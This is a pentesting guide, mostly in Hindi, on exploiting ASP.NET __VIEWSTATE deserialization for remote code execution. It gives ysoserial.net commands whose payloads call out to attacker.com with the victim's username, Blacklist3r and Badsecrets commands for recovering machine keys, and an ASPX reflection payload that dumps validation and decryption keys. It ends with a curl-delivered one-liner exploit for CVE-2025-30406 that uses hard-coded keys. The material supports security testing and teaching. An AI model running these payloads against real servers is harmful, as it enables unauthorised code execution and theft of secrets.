# Exploiting \_\_VIEWSTATE without knowing the secrets

{{#include ../../banners/hacktricks-training.md}}

## What is ViewState

**ViewState** ASP.NET में वेब पृष्ठों के बीच पृष्ठ और नियंत्रण डेटा बनाए रखने के लिए डिफ़ॉल्ट तंत्र के रूप में कार्य करता है। एक पृष्ठ के HTML के रेंडरिंग के दौरान, पृष्ठ की वर्तमान स्थिति और पोस्टबैक के दौरान संरक्षित किए जाने वाले मानों को base64-encoded स्ट्रिंग्स में सीरियलाइज़ किया जाता है। ये स्ट्रिंग्स फिर छिपे हुए ViewState फ़ील्ड में रखी जाती हैं।

ViewState जानकारी को निम्नलिखित गुणों या उनके संयोजनों द्वारा वर्णित किया जा सकता है:

- **Base64**:
- यह प्रारूप तब उपयोग किया जाता है जब `EnableViewStateMac` और `ViewStateEncryptionMode` गुण दोनों को false पर सेट किया गया हो।
- **Base64 + MAC (Message Authentication Code) Enabled**:
- MAC को सक्रिय करने के लिए `EnableViewStateMac` गुण को true पर सेट किया जाता है। यह ViewState डेटा के लिए अखंडता सत्यापन प्रदान करता है।
- **Base64 + Encrypted**:
- एन्क्रिप्शन तब लागू होता है जब `ViewStateEncryptionMode` गुण को true पर सेट किया जाता है, जिससे ViewState डेटा की गोपनीयता सुनिश्चित होती है।

## Test Cases

यह चित्र ASP.NET में ViewState के विभिन्न कॉन्फ़िगरेशन का एक तालिका है जो .NET फ्रेमवर्क संस्करण पर आधारित है। यहाँ सामग्री का सारांश है:

1. **किसी भी संस्करण के लिए .NET**, जब MAC और एन्क्रिप्शन दोनों अक्षम होते हैं, तो MachineKey की आवश्यकता नहीं होती है, और इसलिए इसे पहचानने के लिए कोई लागू विधि नहीं है।
2. **4.5 से नीचे के संस्करणों के लिए**, यदि MAC सक्षम है लेकिन एन्क्रिप्शन नहीं है, तो MachineKey की आवश्यकता होती है। MachineKey की पहचान करने की विधि को "Blacklist3r" कहा जाता है।
3. **4.5 से नीचे के संस्करणों के लिए**, चाहे MAC सक्षम हो या अक्षम, यदि एन्क्रिप्शन सक्षम है, तो MachineKey की आवश्यकता होती है। MachineKey की पहचान करना "Blacklist3r - Future Development" का कार्य है।
4. **4.5 और उससे ऊपर के संस्करणों के लिए**, MAC और एन्क्रिप्शन के सभी संयोजन (चाहे दोनों सत्य हों, या एक सत्य हो और दूसरा असत्य) के लिए MachineKey की आवश्यकता होती है। MachineKey की पहचान "Blacklist3r" का उपयोग करके की जा सकती है।

### Test Case: 1 – EnableViewStateMac=false and viewStateEncryptionMode=false

यह संभव है कि ViewStateMAC को पूरी तरह से अक्षम किया जाए, `AspNetEnforceViewStateMac` रजिस्ट्री कुंजी को शून्य पर सेट करके:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**ViewState विशेषताओं की पहचान करना**

आप BurpSuite के साथ इस पैरामीटर को शामिल करने वाले अनुरोध को कैप्चर करके यह पहचानने की कोशिश कर सकते हैं कि क्या ViewState MAC से सुरक्षित है। यदि Mac का उपयोग पैरामीटर की सुरक्षा के लिए नहीं किया गया है, तो आप इसे [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) का उपयोग करके शोषण कर सकते हैं।
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### Test case 1.5 – Like Test case 1 but the ViewState cookie isn't sent by the server

Developers can **remove ViewState** from becoming part of an HTTP Request (उपयोगकर्ता को यह कुकी प्राप्त नहीं होगी)।\
One may assume that if **ViewState** is **not present**, their implementation is **secure** from any potential vulnerabilities arising with ViewState deserialization.\
However, that is not the case. If we **add ViewState parameter** to the request body and send our serialized payload created using ysoserial, we will still be able to achieve **code execution** as shown in **Case 1**.

### Test Case: 2 – .Net < 4.5 and EnableViewStateMac=true & ViewStateEncryptionMode=false

In order to **enable ViewState MAC** for a **specific page** we need to make following changes on a specific aspx file:
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
हम इसे **web.config** फ़ाइल में नीचे दिखाए अनुसार सेट करके **कुल** एप्लिकेशन के लिए भी कर सकते हैं:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
इस बार चूंकि पैरामीटर MAC से सुरक्षित है, इसलिए हमले को सफलतापूर्वक निष्पादित करने के लिए हमें पहले उपयोग किया गया कुंजी चाहिए।

आप उपयोग की गई कुंजी खोजने के लिए [**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) का प्रयास कर सकते हैं।
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) एक और उपकरण है जो ज्ञात machineKeys की पहचान कर सकता है। यह Python में लिखा गया है, इसलिए Blacklist3r के विपरीत, इसमें कोई Windows निर्भरता नहीं है। .NET viewstates के लिए, एक "python blacklist3r" उपयोगिता है, जो इसका उपयोग करने का सबसे तेज़ तरीका है।

इसे सीधे viewstate और generator के साथ प्रदान किया जा सकता है:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
![https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png](https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png)

या, यह सीधे लक्षित URL से कनेक्ट कर सकता है और HTML से viewstate को निकालने की कोशिश कर सकता है:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
![https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png](https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png)

कमजोर viewstates को बड़े पैमाने पर खोजने के लिए, उपडोमेन एन्यूमरेशन के साथ, `badsecrets` [**BBOT**](exploiting-__viewstate-parameter.md) मॉड्यूल का उपयोग किया जा सकता है:
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
![https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png](https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png)

यदि आप भाग्यशाली हैं और कुंजी मिल जाती है, तो आप [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**:** के साथ हमले को आगे बढ़ा सकते हैं।
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
जब `_VIEWSTATEGENERATOR` पैरामीटर **सर्वर द्वारा नहीं भेजा जाता** है, तो आपको `--generator` पैरामीटर **प्रदान करने की आवश्यकता नहीं है** बल्कि इन पैरामीटर को **प्रदान करना होगा**:
```bash
--apppath="/" --path="/hello.aspx"
```
### Test Case: 3 – .Net < 4.5 और EnableViewStateMac=true/false और ViewStateEncryptionMode=true

इसमें यह ज्ञात नहीं है कि क्या पैरामीटर MAC के साथ सुरक्षित है। तब, मान शायद एन्क्रिप्टेड है और आपको **अपने पेलोड को एन्क्रिप्ट करने के लिए मशीन की आवश्यकता होगी** ताकि आप इस कमजोरियों का लाभ उठा सकें।

**इस मामले में** [**Blacklist3r**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) **मॉड्यूल विकासाधीन है...**

**.NET 4.5 से पहले**, ASP.NET **एक** **अनएन्क्रिप्टेड** \_`__VIEWSTATE`\_ पैरामीटर को उपयोगकर्ताओं से **स्वीकार** कर सकता है **यहां तक कि** यदि **`ViewStateEncryptionMode`** को _**हमेशा**_ पर सेट किया गया है। ASP.NET **केवल जांचता है** कि **`__VIEWSTATEENCRYPTED`** पैरामीटर अनुरोध में **मौजूद** है। **यदि कोई इस पैरामीटर को हटा देता है, और अनएन्क्रिप्टेड पेलोड भेजता है, तो इसे अभी भी संसाधित किया जाएगा।**

इसलिए यदि हमलावर किसी अन्य कमजोरियों जैसे फ़ाइल ट्रैवर्सल के माध्यम से मशीन की प्राप्त करने का तरीका खोज लेते हैं, तो [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) कमांड का उपयोग **केस 2** में किया गया, ViewState डेसिरियलाइजेशन कमजोरियों का उपयोग करके RCE करने के लिए किया जा सकता है।

- ViewState डेसिरियलाइजेशन कमजोरियों का लाभ उठाने के लिए अनुरोध से `__VIEWSTATEENCRYPTED` पैरामीटर को हटा दें, अन्यथा यह एक Viewstate MAC सत्यापन त्रुटि लौटाएगा और हमला विफल हो जाएगा।

### Test Case: 4 – .Net >= 4.5 और EnableViewStateMac=true/false और ViewStateEncryptionMode=true/false सिवाय दोनों गुणों के false होने के

हम नीचे दिए गए पैरामीटर को web.config फ़ाइल के अंदर निर्दिष्ट करके ASP.NET ढांचे का उपयोग करने के लिए मजबूर कर सकते हैं जैसा कि नीचे दिखाया गया है।
```xml
<httpRuntime targetFramework="4.5" />
```
वैकल्पिक रूप से, यह `web.config` फ़ाइल के `machineKey` पैरामीटर के अंदर नीचे दिए गए विकल्प को निर्दिष्ट करके किया जा सकता है।
```bash
compatibilityMode="Framework45"
```
जैसे कि पिछले में **मान एन्क्रिप्टेड है।** फिर, एक **मान्य पेलोड भेजने के लिए हमलावर को कुंजी की आवश्यकता है।**

आप कुंजी खोजने के लिए [**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) का उपयोग करने की कोशिश कर सकते हैं:
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
IISDirPath और TargetPagePath के लिए अधिक विस्तृत विवरण के लिए [यहाँ देखें](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

या, [**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) (एक जनरेटर मान के साथ):
```bash
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
![https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png](https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png)

एक मान्य मशीन कुंजी पहचानने के बाद, **अगला कदम एक अनुक्रमित पेलोड उत्पन्न करना है** [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
यदि आपके पास `__VIEWSTATEGENERATOR` का मान है, तो आप उस मान के साथ `--generator` पैरामीटर का **उपयोग** करने की कोशिश कर सकते हैं और `--path` और `--apppath` पैरामीटर को **छोड़** सकते हैं।

![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2019/06/4.2.png)

ViewState deserialization भेद्यता का सफल शोषण एक हमलावर-नियंत्रित सर्वर पर एक आउट-ऑफ-बैंड अनुरोध की ओर ले जाएगा, जिसमें उपयोगकर्ता नाम शामिल है। इस प्रकार के शोषण को एक प्रमाणित अवधारणा (PoC) में प्रदर्शित किया गया है, जिसे "Exploiting ViewState Deserialization using Blacklist3r and YsoSerial.NET" शीर्षक वाले संसाधन के माध्यम से पाया जा सकता है। शोषण प्रक्रिया कैसे काम करती है और MachineKey की पहचान के लिए Blacklist3r जैसे उपकरणों का उपयोग कैसे करें, इस पर अधिक जानकारी के लिए, आप प्रदान किए गए [PoC of Successful Exploitation](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC) की समीक्षा कर सकते हैं।

### Test Case 6 – ViewStateUserKeys का उपयोग किया जा रहा है

**ViewStateUserKey** प्रॉपर्टी का **CSRF हमले** के खिलाफ **रक्षा** के लिए उपयोग किया जा सकता है। यदि ऐसा एक कुंजी एप्लिकेशन में परिभाषित की गई है और हम अब तक चर्चा किए गए तरीकों से **ViewState** पेलोड उत्पन्न करने की कोशिश करते हैं, तो **पेलोड को एप्लिकेशन द्वारा संसाधित नहीं किया जाएगा**।\
आपको पेलोड को सही तरीके से बनाने के लिए एक और पैरामीटर का उपयोग करने की आवश्यकता है:
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
### सफल शोषण का परिणाम <a href="#poc" id="poc"></a>

सभी परीक्षण मामलों के लिए, यदि ViewState YSoSerial.Net पेलोड **सफलता** से काम करता है, तो सर्वर “**500 आंतरिक सर्वर त्रुटि**” के साथ प्रतिक्रिया करता है जिसमें प्रतिक्रिया सामग्री “**यह पृष्ठ के लिए राज्य जानकारी अमान्य है और यह भ्रष्ट हो सकती है**” होती है और हमें OOB अनुरोध मिलता है।

[यहां आगे की जानकारी के लिए जांचें](<https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/deserialization/[**https:/www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https:/www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)/README.md>)

### रिफ्लेक्शन के माध्यम से ASP.NET मशीन कुंजियों को डंप करना (SharPyShell/SharePoint ToolShell)

हमलावर जो लक्ष्य वेब रूट के अंदर **मनमाने ASPX कोड को अपलोड या निष्पादित** करने में सक्षम हैं, वे सीधे `__VIEWSTATE` की सुरक्षा करने वाली गुप्त कुंजियों को प्राप्त कर सकते हैं, बजाय इसके कि उन्हें ब्रूटफोर्स किया जाए। 
एक न्यूनतम पेलोड जो कुंजियों को लीक करता है, रिफ्लेक्शन के माध्यम से आंतरिक .NET कक्षाओं का उपयोग करता है:
```csharp
<%@ Import Namespace="System.Web.Configuration" %>
<%@ Import Namespace="System.Reflection" %>
<script runat="server">
public void Page_Load(object sender, EventArgs e)
{
var asm = Assembly.Load("System.Web");
var sect = asm.GetType("System.Web.Configuration.MachineKeySection");
var m = sect.GetMethod("GetApplicationConfig", BindingFlags.Static | BindingFlags.NonPublic);
var cfg = (MachineKeySection)m.Invoke(null, null);
// Output: ValidationKey|DecryptionKey|Algorithm|CompatibilityMode
Response.Write($"{cfg.ValidationKey}|{cfg.DecryptionKey}|{cfg.Decryption}|{cfg.CompatibilityMode}");
}
</script>
```
पृष्ठ को अनुरोध करने पर **ValidationKey**, **DecryptionKey**, एन्क्रिप्शन एल्गोरिदम और ASP.NET संगतता मोड प्रिंट होते हैं। इन मानों को अब सीधे **ysoserial.net** में फीड किया जा सकता है ताकि एक मान्य, हस्ताक्षरित `__VIEWSTATE` गैजेट बनाया जा सके:
```bash
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
-c "powershell -nop -c \"whoami\"" \
--generator=<VIEWSTATE_GENERATOR> \
--validationkey=<VALIDATION_KEY> --validationalg=<VALIDATION_ALG> \
--decryptionkey=<DECRYPTION_KEY> --decryptionalg=<DECRYPTION_ALG> \
--islegacy --minify
curl "http://victim/page.aspx?__VIEWSTATE=<PAYLOAD>"
```
यह **key-exfiltration primitive** 2025 में ऑन-प्रेम SharePoint सर्वरों के खिलाफ बड़े पैमाने पर शोषित किया गया था ("ToolShell" – CVE-2025-53770/53771), लेकिन यह किसी भी ASP.NET एप्लिकेशन पर लागू होता है जहां एक हमलावर सर्वर-साइड कोड चला सकता है।

## 2024-2025 वास्तविक दुनिया के शोषण परिदृश्य और हार्ड-कोडेड मशीन कुंजी

### Microsoft “सार्वजनिक रूप से प्रकट मशीन कुंजी” लहर (दिसंबर 2024 – फरवरी 2025)
Microsoft Threat Intelligence ने उन ASP.NET साइटों के बड़े पैमाने पर शोषण की रिपोर्ट की जहां *machineKey* पहले सार्वजनिक स्रोतों (GitHub gists, ब्लॉग पोस्ट, पेस्ट साइटों) पर लीक हो गई थी। प्रतिकूलों ने इन कुंजियों की गणना की और नए `ysoserial.net` 1.41 `--minify` और `--islegacy` ध्वजों के साथ मान्य `__VIEWSTATE` गैजेट्स उत्पन्न किए ताकि WAF लंबाई सीमाओं से बचा जा सके:
```bash
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "whoami" \
--validationkey=<LEAKED_VALIDATION_KEY> --validationalg=SHA1 \
--decryptionkey=<LEAKED_DECRYPTION_KEY> --decryptionalg=AES \
--generator=<VIEWSTATEGEN> --minify
```
स्थिर कुंजी को घुमाना या Web .config में *AutoGenerate* कुंजी पर स्विच करना (`<machineKey ... validationKey="AutoGenerate" decryptionKey="AutoGenerate" />`) इस प्रकार के हमलों को कम करता है।

### CVE-2025-30406 – Gladinet CentreStack / Triofox हार्ड-कोडेड कुंजी
Kudelski Security ने खुलासा किया कि कई CentreStack / Triofox रिलीज़ में समान `machineKey` मान शामिल थे, जिससे ViewState धोखाधड़ी के माध्यम से बिना प्रमाणीकरण के दूरस्थ कोड निष्पादन की अनुमति मिली (CVE-2025-30406)।

One-liner exploit:
```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "calc.exe" \
--validationkey=ACC97055B2A494507D7D7C92DC1C854E8EA7BF4C \
--validationalg=SHA1 \
--decryptionkey=1FB1DEBB8B3B492390B2ABC63E6D1B53DC9CA2D7 \
--decryptionalg=AES --generator=24D41AAB --minify \
| curl -d "__VIEWSTATE=$(cat -)" http://victim/portal/loginpage.aspx
```
CentreStack 16.4.10315.56368 / Triofox 16.4.10317.56372 में सुधार किया गया है – तुरंत कुंजी को अपग्रेड या बदलें।

## संदर्भ

- [Exploiting ViewState deserialization using Blacklist3r and YSoSerial.NET](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
- [Deep dive into .NET ViewState deserialization and its exploitation](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)
- [Exploiting deserialisation in ASP.NET via ViewState (Soroush Dalili, 2019)](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
- [Introducing badsecrets – fast machineKey discovery](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)
- [SharePoint “ToolShell” exploitation chain (Eye Security, 2025)](https://research.eye.security/sharepoint-under-siege/)
- [Microsoft Security – Code injection attacks abusing publicly disclosed ASP.NET machine keys (Feb 6 2025)](https://www.microsoft.com/en-us/security/blog/2025/02/06/code-injection-attacks-using-publicly-disclosed-asp-net-machine-keys/)
- [Kudelski Security advisory – Gladinet CentreStack / Triofox RCE CVE-2025-30406 (Apr 16 2025)](https://research.kudelskisecurity.com/2025/04/16/gladinet-centrestack-and-gladinet-triofox-critical-rce-cve-2025-30406/)
- [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
- [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)
- [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
- [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)
- [SharePoint “ToolShell” exploitation chain (Eye Security, 2025)](https://research.eye.security/sharepoint-under-siege/)

{{#include ../../banners/hacktricks-training.md}}
